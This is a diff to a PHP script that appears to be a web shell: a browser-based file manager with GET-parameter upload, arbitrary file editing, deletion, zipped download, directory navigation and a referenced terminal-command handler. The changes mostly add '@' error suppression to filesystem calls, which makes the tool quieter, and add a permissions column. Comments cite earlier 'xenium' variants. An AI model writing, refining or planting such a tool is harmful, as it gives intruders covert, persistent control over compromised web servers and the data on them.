@@ -10,16 +10,16 @@ ini_set('session.save_handler', 'files');
 
 // Fix session path issue from xenium3
  $sessionPath = sys_get_temp_dir() . '/php_sessions';
-if (!is_dir($sessionPath)) {
+if (!@is_dir($sessionPath)) {
     @mkdir($sessionPath, 0700, true);
 }
-if (is_dir($sessionPath) && is_writable($sessionPath)) {
+if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
     ini_set('session.save_path', $sessionPath);
 }
 
 session_start();
 
-if (!isset($_SESSION['current_dir']) || !is_dir($_SESSION['current_dir'])) {
+if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir'])) {
     $_SESSION['current_dir'] = getcwd();
 }
 
@@ -34,11 +34,11 @@ if(!empty($_GET['upload_file']) && !empty($_GET['name'])){
     }
     
     // Ensure directory exists - fix from xenium2
-    if (!is_dir($targetDir)) {
+    if (!@is_dir($targetDir)) {
         @mkdir($targetDir, 0755, true);
     }
     
-    if (!is_dir($targetDir) || !is_writable($targetDir)) {
+    if (!@is_dir($targetDir) || !@is_writable($targetDir)) {
         http_response_code(400);
         exit('Invalid directory');
     }
@@ -67,8 +67,8 @@ if(!empty($_GET['upload_file']) && !empty($_GET['name'])){
 }
 
 function validatePath($path) {
-    $realPath = realpath($path);
-    if ($realPath && (is_file($realPath) || is_dir($realPath))) {
+    $realPath = @realpath($path);
+    if ($realPath && (@is_file($realPath) || @is_dir($realPath))) {
         return $realPath;
     }
     return false;
@@ -150,13 +150,13 @@ if (isset($_POST['bulk_delete']) && isset($_POST['selected_items']) && is_array(
             continue;
         }
         
-        if (is_file($targetPath)) {
+        if (@is_file($targetPath)) {
             if (@unlink($targetPath)) {
                 $deleted++;
             } else {
                 $failed++;
             }
-        } elseif (is_dir($targetPath)) {
+        } elseif (@is_dir($targetPath)) {
             try {
                 $iterator = new RecursiveIteratorIterator(
                     new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
@@ -205,9 +205,9 @@ if (isset($_POST['bulk_download']) && isset($_POST['selected_items']) && is_arra
                 
                 if ($targetPath === false) continue;
                 
-                if (is_file($targetPath)) {
+                if (@is_file($targetPath)) {
                     $zip->addFile($targetPath, basename($targetPath));
-                } elseif (is_dir($targetPath)) {
+                } elseif (@is_dir($targetPath)) {
                     $files = new RecursiveIteratorIterator(
                         new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                         RecursiveIteratorIterator::SELF_FIRST
@@ -244,7 +244,7 @@ if (isset($_POST['bulk_download']) && isset($_POST['selected_items']) && is_arra
 
 if (isset($_POST['navigate'])) {
     $targetDir = $_POST['navigate'];
-    if (is_dir($targetDir)) {
+    if (@is_dir($targetDir)) {
         $_SESSION['current_dir'] = validatePath($targetDir);
         $notification = 'Directory changed successfully';
     }
@@ -259,7 +259,7 @@ if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] !== UPLOAD_
         // Additional security check
         if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
             $errorMsg = 'Upload failed: Invalid filename';
-        } elseif (!is_writable($_SESSION['current_dir'])) {
+        } elseif (!@is_writable($_SESSION['current_dir'])) {
             $errorMsg = 'Upload failed: Directory not writable';
         } elseif (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
             @chmod($uploadPath, 0644);
@@ -285,13 +285,13 @@ if (isset($_POST['remove'])) {
     
     if ($targetPath === false) {
         $errorMsg = 'Delete failed: Invalid path';
-    } elseif (is_file($targetPath)) {
+    } elseif (@is_file($targetPath)) {
         if (@unlink($targetPath)) {
             $notification = 'File deleted';
         } else {
             $errorMsg = 'Delete failed: Permission denied or file in use';
         }
-    } elseif (is_dir($targetPath)) {
+    } elseif (@is_dir($targetPath)) {
         try {
             $iterator = new RecursiveIteratorIterator(
                 new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
@@ -327,7 +327,7 @@ if (isset($_POST['old_name'], $_POST['new_name'])) {
     } else {
         $destinationPath = dirname($sourcePath) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
         
-        if (file_exists($destinationPath)) {
+        if (@file_exists($destinationPath)) {
             $errorMsg = 'Rename failed: Target name already exists';
         } elseif (@rename($sourcePath, $destinationPath)) {
             $notification = 'Rename successful';
@@ -341,9 +341,9 @@ if (isset($_POST['old_name'], $_POST['new_name'])) {
 if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
     $editPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['file_to_edit']);
     
-    if ($editPath === false || !is_file($editPath)) {
+    if ($editPath === false || !@is_file($editPath)) {
         $errorMsg = 'Edit failed: File not found';
-    } elseif (!is_writable($editPath)) {
+    } elseif (!@is_writable($editPath)) {
         $errorMsg = 'Edit failed: File not writable';
     } else {
         // Direct content without base64 decoding
@@ -381,9 +381,9 @@ if (isset($_POST['create_file']) && trim($_POST['create_file']) !== '') {
     } else {
         $newFilePath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fileName;
         
-        if (file_exists($newFilePath)) {
+        if (@file_exists($newFilePath)) {
             $errorMsg = 'Create failed: File already exists';
-        } elseif (!is_writable($_SESSION['current_dir'])) {
+        } elseif (!@is_writable($_SESSION['current_dir'])) {
             $errorMsg = 'Create failed: Directory not writable';
         } elseif (@file_put_contents($newFilePath, '') !== false) {
             @chmod($newFilePath, 0644);
@@ -402,9 +402,9 @@ if (isset($_POST['create_folder']) && trim($_POST['create_folder']) !== '') {
     } else {
         $newFolderPath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $folderName;
         
-        if (file_exists($newFolderPath)) {
+        if (@file_exists($newFolderPath)) {
             $errorMsg = 'Create failed: Folder already exists';
-        } elseif (!is_writable($_SESSION['current_dir'])) {
+        } elseif (!@is_writable($_SESSION['current_dir'])) {
             $errorMsg = 'Create failed: Directory not writable';
         } elseif (@mkdir($newFolderPath, 0755)) {
             $notification = 'Folder created';
@@ -421,7 +421,7 @@ if (isset($_POST['create_folder']) && trim($_POST['create_folder']) !== '') {
 foreach ($directoryContents as $item) {
     if ($item === '.') continue;
     $fullPath = $currentDirectory . '/' . $item;
-    if (is_dir($fullPath)) {
+    if (@is_dir($fullPath)) {
         $folders[] = $item;
     } else {
         $files[] = $item;
@@ -445,14 +445,14 @@ if (isset($_POST['download'])) {
     
     if ($targetPath === false) {
         $errorMsg = 'Download failed: Invalid path';
-    } elseif (is_file($targetPath)) {
+    } elseif (@is_file($targetPath)) {
         // Direct file download
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
         header('Content-Length: ' . filesize($targetPath));
         readfile($targetPath);
         exit;
-    } elseif (is_dir($targetPath)) {
+    } elseif (@is_dir($targetPath)) {
         // Zip folder and download
         if (class_exists('ZipArchive')) {
             $zipName = basename($targetPath) . '_' . time() . '.zip';
@@ -1400,6 +1400,7 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
                 <th style="width: 120px;">Type</th>
                 <th style="width: 100px; text-align: right;">Size</th>
                 <th style="width: 160px; text-align: center;">Modified</th>
+                <th style="width: 80px; text-align: center;">Permission</th>
                 <th style="width: auto; text-align: right;">Actions</th>
             </tr>
         </thead>
@@ -1414,14 +1415,14 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
             $realPath = validatePath($fullPath);
 
             if ($realPath !== false) {
-                $isDirectory = is_dir($realPath);
-                $canWrite = is_writable($realPath);
-                $fileSize = $isDirectory ? 0 : filesize($realPath);
-                $fileModTime = filemtime($realPath);
-                $filePerms = substr(sprintf('%o', fileperms($realPath)), -4);
+                $isDirectory = @is_dir($realPath);
+                $canWrite = @is_writable($realPath);
+                $fileSize = $isDirectory ? 0 : @filesize($realPath);
+                $fileModTime = @filemtime($realPath);
+                $filePerms = @substr(sprintf('%o', @fileperms($realPath)), -4);
             } else {
                 // Set default values if the path is invalid (e.g., a broken symlink)
-                $isDirectory = is_dir($fullPath); // is_dir() will be false for broken links
+                $isDirectory = @is_dir($fullPath); // is_dir() will be false for broken links
                 $canWrite = false;
                 $fileSize = 0;
                 $fileModTime = 0;
@@ -1473,8 +1474,10 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
                 <td>
                     <span class="file-date"><?= date('Y-m-d H:i:s', $fileModTime) ?></span>
                 </td>
-                <td>
+                <td style="text-align: center;">
                     <span class="<?= $canWrite ? 'writable' : 'readonly' ?>"><?= $filePerms ?></span>
+                </td>
+                <td>
                     <div class="action-buttons">
                         <?php if (!$isDirectory): ?>
                             <form method="post" style="display:inline;">
